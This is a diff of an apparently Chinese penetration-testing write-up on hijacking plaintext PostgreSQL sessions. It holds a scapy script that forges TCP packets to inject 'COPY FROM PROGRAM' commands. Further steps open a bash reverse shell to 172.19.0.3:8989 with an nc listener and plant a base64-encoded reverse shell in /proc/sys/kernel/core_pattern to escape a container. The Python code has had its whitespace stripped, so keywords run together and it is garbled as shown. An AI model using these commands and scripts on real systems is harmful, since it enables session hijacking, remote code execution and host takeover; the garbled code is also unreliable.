@@ -69,7 +69,12 @@ tcpdump抓包发现明文通信
 
 随后我们写一个脚本，这里感谢flower的友情协助优化后的脚本
 
-fromscapy.allimport*importstructimportsysiface ="eth0"pg_port =5432counter =0# 监听 PostgreSQL 返回的 DataRow 包，提取里面的字段内容defparse_all_pgsql_data_rows(data): i =0 results = [] length = len(data) whilei < length: ifdata[i:i+1] ==b'D': # DataRow包标识 ifi +5> length: break row_len = struct.unpack('!I', data[i+1:i+5])[0] start = i +5 end = start + row_len -4 ifend > length: break row_data = data[start:end] iflen(row_data) <2: break field_count = struct.unpack('!H', row_data[:2])[0] pos =2 fields = [] for_inrange(field_count): ifpos +4> len(row_data): break field_len = struct.unpack('!I', row_data[pos:pos+4])[0] pos +=4 iffield_len ==0xFFFFFFFF: fields.append(None) else: field_val = row_data[pos:pos+field_len].decode('utf-8', errors='replace') fields.append(field_val) pos += field_len results.append(fields) i = end else: i +=1 returnresultsdefmake_query_payload(sql): sql_bytes = sql.encode() +b'x00' length = len(sql_bytes) +4 returnb'Q'+ length.to_bytes(4, byteorder='big') + sql_bytesdefon_packet(pkt): globalcounter, queries, max_packets ifIPinpktandTCPinpkt: tcp = pkt[TCP] ip = pkt[IP] iftcp.sport == pg_port: # 打印捕获到的 DataRow 内容 ifRawinpkt: data = pkt[Raw].load rows = parse_all_pgsql_data_rows(data) ifrows: forfieldsinrows: print("[PostgreSQL Data Row Fields]:") forfinfields: print(" "+ (fiffelse'NULL')) print("-"*50) ifcounter >= max_packets: print("All queries sent. Stopping sniff.") raiseKeyboardInterrupt src_ip = ip.dst dst_ip = ip.src src_port = tcp.dport dst_port = tcp.sport seq_num = tcp.ack ack_num = tcp.seq + len(tcp.payload) sql = queries[counter] print(f"[Captured]{ip.src}:{tcp.sport}->{ip.dst}:{tcp.dport}") print(f"[Construct] Sending query with seq={seq_num}ack={ack_num}:{sql}") payload = make_query_payload(sql) pkt_to_send = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq_num, ack=ack_num) / Raw(load=payload) send(pkt_to_send, iface=iface, verbose=False) print("[Sent] SQL query sent.n") counter +=1defmain(): globalqueries, max_packets iflen(sys.argv) <2: print(f"Usage: python3{sys.argv[0]}<command_to_run>") print(f"Example: python3{sys.argv[0]}'whoami'") sys.exit(1) # 从argv获取命令参数 cmd = sys.argv[1] queries = [ "CREATE TEMP TABLE tmp_output(line text);", f"COPY tmp_output FROM PROGRAM '{cmd}';", "SELECT * FROM tmp_output;" ] max_packets = len(queries) print(f"Listening on PostgreSQL server port{pg_port}, sending queries on packet capture.") print(f"Command to run on server:{cmd}") try: sniff(iface=iface, filter=f"tcp and src port{pg_port}", prn=on_packet, store=0) exceptKeyboardInterrupt: print("Program terminated.")if__name__ =="__main__":main()
+fromscapy.allimport*importstructimportsysiface ="eth0"pg_port =5432counter =0
+# 监听 PostgreSQL 返回的 DataRow 包，提取里面的字段内容defparse_all_pgsql_data_rows(data): i =0 results = [] length = len(data) whilei < length: ifdata[i:i+1] ==b'D': # DataRow包标识 ifi +5> length: break row_len = struct.unpack('!I', data[i+1:i+5])[0] start = i +5 end = start + row_len -4 ifend > length: break row_data = data[start:
+end] iflen(row_data) <2: break field_count = struct.unpack('!H', row_data[:2])[0] pos =2 fields = [] for_inrange(field_count): ifpos +4> len(row_data): break field_len = struct.unpack('!I', row_data[pos:
+pos+4])[0] pos +=4 iffield_len ==0xFFFFFFFF: fields.append(None) else: field_val = row_data[pos:
+pos+field_len].decode('utf-8', errors='replace') fields.append(field_val) pos += field_len results.append(fields) i = end else: i +=1 returnresultsdefmake_query_payload(sql): sql_bytes = sql.encode() +b'x00' length = len(sql_bytes) +4 returnb'Q'+ length.to_bytes(4, byteorder='big') + sql_bytesdefon_packet(pkt): globalcounter, queries, max_packets ifIPinpktandTCPinpkt: tcp = pkt[TCP] ip = pkt[IP] iftcp.sport == pg_port: # 打印捕获到的 DataRow 内容 ifRawinpkt: data = pkt[Raw].load rows = parse_all_pgsql_data_rows(data) ifrows: forfieldsinrows: print("[PostgreSQL Data Row Fields]:") forfinfields: print(" "+ (fiffelse'NULL')) print("-"*50) ifcounter >= max_packets: print("All queries sent. Stopping sniff.") raiseKeyboardInterrupt src_ip = ip.dst dst_ip = ip.src src_port = tcp.dport dst_port = tcp.sport seq_num = tcp.ack ack_num = tcp.seq + len(tcp.payload) sql = queries[counter] print(f"[Captured]{ip.src}:{tcp.sport}->{ip.dst}:{tcp.dport}") print(f"[Construct] Sending query with seq={seq_num}ack={ack_num}:{sql}") payload = make_query_payload(sql) pkt_to_send = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq_num, ack=ack_num) / Raw(load=payload) send(pkt_to_send, iface=iface, verbose=False) print("[Sent] SQL query sent.n") counter +=1defmain(): globalqueries, max_packets iflen(sys.argv) <2: print(f"Usage: python3{sys.argv[0]}<command_to_run>") print(f"Example: python3{sys.argv[0]}'whoami'") sys.exit(1) # 从argv获取命令参数 cmd = sys.argv[1] queries = [ "CREATE TEMP TABLE tmp_output(line text);", f"COPY tmp_output FROM PROGRAM '{cmd}';", "SELECT * FROM tmp_output;" ] max_packets = len(queries) print(f"Listening on PostgreSQL server port{pg_port}, sending queries on packet capture.") print(f"Command to run on server:{cmd}") try: sniff(iface=iface, filter=f"tcp and src port{pg_port}", prn=on_packet, store=0) exceptKeyboardInterrupt: print("Program terminated.")if__name__ =="__main__":
+main()
 
 通过这个脚本，我们可以实现伪造tcp包，处理并发送我们的查询语句
 
@@ -151,42 +156,17 @@ Twitter：@wgpsec
 
 
 ```
-fromscapy.allimport*importstructimportsysiface ="eth0"pg_port =5432counter =0# 监听 PostgreSQL 返回的 DataRow 包，提取里面的字段内容defparse_all_pgsql_data_rows(data): i =0 results = [] length = len(data) whilei < length: ifdata[i:i+1] ==b'D': # DataRow包标识 ifi +5> length: break row_len = struct.unpack('!I', data[i+1:i+5])[0] start = i +5 end = start + row_len -4 ifend > length: break row_data = data[start:end] iflen(row_data) <2: break field_count = struct.unpack('!H', row_data[:2])[0] pos =2 fields = [] for_inrange(field_count): ifpos +4> len(row_data): break field_len = struct.unpack('!I', row_data[pos:pos+4])[0] pos +=4 iffield_len ==0xFFFFFFFF: fields.append(None) else: field_val = row_data[pos:pos+field_len].decode('utf-8', errors='replace') fields.append(field_val) pos += field_len results.append(fields) i = end else: i +=1 returnresultsdefmake_query_payload(sql): sql_bytes = sql.encode() +b'x00' length = len(sql_bytes) +4 returnb'Q'+ length.to_bytes(4, byteorder='big') + sql_bytesdefon_packet(pkt): globalcounter, queries, max_packets ifIPinpktandTCPinpkt: tcp = pkt[TCP] ip = pkt[IP] iftcp.sport == pg_port: # 打印捕获到的 DataRow 内容 ifRawinpkt: data = pkt[Raw].load rows = parse_all_pgsql_data_rows(data) ifrows: forfieldsinrows: print("[PostgreSQL Data Row Fields]:") forfinfields: print(" "+ (fiffelse'NULL')) print("-"*50) ifcounter >= max_packets: print("All queries sent. Stopping sniff.") raiseKeyboardInterrupt src_ip = ip.dst dst_ip = ip.src src_port = tcp.dport dst_port = tcp.sport seq_num = tcp.ack ack_num = tcp.seq + len(tcp.payload) sql = queries[counter] print(f"[Captured]{ip.src}:{tcp.sport}->{ip.dst}:{tcp.dport}") print(f"[Construct] Sending query with seq={seq_num}ack={ack_num}:{sql}") payload = make_query_payload(sql) pkt_to_send = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq_num, ack=ack_num) / Raw(load=payload) send(pkt_to_send, iface=iface, verbose=False) print("[Sent] SQL query sent.n") counter +=1defmain(): globalqueries, max_packets iflen(sys.argv) <2: print(f"Usage: python3{sys.argv[0]}<command_to_run>") print(f"Example: python3{sys.argv[0]}'whoami'") sys.exit(1) # 从argv获取命令参数 cmd = sys.argv[1] queries = [ "CREATE TEMP TABLE tmp_output(line text);", f"COPY tmp_output FROM PROGRAM '{cmd}';", "SELECT * FROM tmp_output;" ] max_packets = len(queries) print(f"Listening on PostgreSQL server port{pg_port}, sending queries on packet capture.") print(f"Command to run on server:{cmd}") try: sniff(iface=iface, filter=f"tcp and src port{pg_port}", prn=on_packet, store=0) exceptKeyboardInterrupt: print("Program terminated.")if__name__ =="__main__":main()
-```
-
-
-
-```
+fromscapy.allimport*importstructimportsysiface ="eth0"pg_port =5432counter =0
+# 监听 PostgreSQL 返回的 DataRow 包，提取里面的字段内容defparse_all_pgsql_data_rows(data): i =0 results = [] length = len(data) whilei < length: ifdata[i:i+1] ==b'D': # DataRow包标识 ifi +5> length: break row_len = struct.unpack('!I', data[i+1:i+5])[0] start = i +5 end = start + row_len -4 ifend > length: break row_data = data[start:
+end] iflen(row_data) <2: break field_count = struct.unpack('!H', row_data[:2])[0] pos =2 fields = [] for_inrange(field_count): ifpos +4> len(row_data): break field_len = struct.unpack('!I', row_data[pos:
+pos+4])[0] pos +=4 iffield_len ==0xFFFFFFFF: fields.append(None) else: field_val = row_data[pos:
+pos+field_len].decode('utf-8', errors='replace') fields.append(field_val) pos += field_len results.append(fields) i = end else: i +=1 returnresultsdefmake_query_payload(sql): sql_bytes = sql.encode() +b'x00' length = len(sql_bytes) +4 returnb'Q'+ length.to_bytes(4, byteorder='big') + sql_bytesdefon_packet(pkt): globalcounter, queries, max_packets ifIPinpktandTCPinpkt: tcp = pkt[TCP] ip = pkt[IP] iftcp.sport == pg_port: # 打印捕获到的 DataRow 内容 ifRawinpkt: data = pkt[Raw].load rows = parse_all_pgsql_data_rows(data) ifrows: forfieldsinrows: print("[PostgreSQL Data Row Fields]:") forfinfields: print(" "+ (fiffelse'NULL')) print("-"*50) ifcounter >= max_packets: print("All queries sent. Stopping sniff.") raiseKeyboardInterrupt src_ip = ip.dst dst_ip = ip.src src_port = tcp.dport dst_port = tcp.sport seq_num = tcp.ack ack_num = tcp.seq + len(tcp.payload) sql = queries[counter] print(f"[Captured]{ip.src}:{tcp.sport}->{ip.dst}:{tcp.dport}") print(f"[Construct] Sending query with seq={seq_num}ack={ack_num}:{sql}") payload = make_query_payload(sql) pkt_to_send = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq_num, ack=ack_num) / Raw(load=payload) send(pkt_to_send, iface=iface, verbose=False) print("[Sent] SQL query sent.n") counter +=1defmain(): globalqueries, max_packets iflen(sys.argv) <2: print(f"Usage: python3{sys.argv[0]}<command_to_run>") print(f"Example: python3{sys.argv[0]}'whoami'") sys.exit(1) # 从argv获取命令参数 cmd = sys.argv[1] queries = [ "CREATE TEMP TABLE tmp_output(line text);", f"COPY tmp_output FROM PROGRAM '{cmd}';", "SELECT * FROM tmp_output;" ] max_packets = len(queries) print(f"Listening on PostgreSQL server port{pg_port}, sending queries on packet capture.") print(f"Command to run on server:{cmd}") try: sniff(iface=iface, filter=f"tcp and src port{pg_port}", prn=on_packet, store=0) exceptKeyboardInterrupt: print("Program terminated.")if__name__ =="__main__":
+main()
 # 伪造TCP包的关键参数计算 src_ip = ip.dst # 伪装成客户端IP dst_ip = ip.src # 目标为服务器IP src_port = tcp.dport # 客户端端口 dst_port = tcp.sport # 服务器端口(5432) seq_num = tcp.ack # 使用服务器期望的序列号 ack_num = tcp.seq + len(tcp.payload) # 计算正确的确认号
-```
-
-
-
-```
 vim 1.pychmod +x 1.pyapt update && apt install screen -y
-```
-
-
-
-```
 nc -lvnp 8989
-```
-
-
-
-```
 python3 1.py ‘bash -c "bash -i >& /dev/tcp/172.19.0.3/8989 0>&1"’
-```
-
-
-
-```
 echo '|/bin/bash -c echo${IFS%%??}c2ggLWkgPiYvZGV2L3RjcC8xNzIuMTkuMC4zLzg4OTkgMD4mMQ==|base64${IFS%%??}-d|/bin/bash' > /proc/sys/kernel/core_pattern
-```
-
-
-
-```
 sh -c 'kill -11 "$$"'
 ```
 
